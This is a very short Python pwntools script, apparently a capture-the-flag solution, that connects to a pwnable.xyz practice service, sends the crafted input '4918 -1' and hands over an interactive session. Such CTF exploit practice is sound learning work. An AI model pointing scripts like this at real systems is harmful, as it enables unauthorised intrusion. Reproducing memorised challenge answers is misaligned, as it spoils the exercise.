from pwn import *

r = remote('svc.pwnable.xyz',30001)

r.sendlineafter('input: ','4918 -1')
r.interactive()

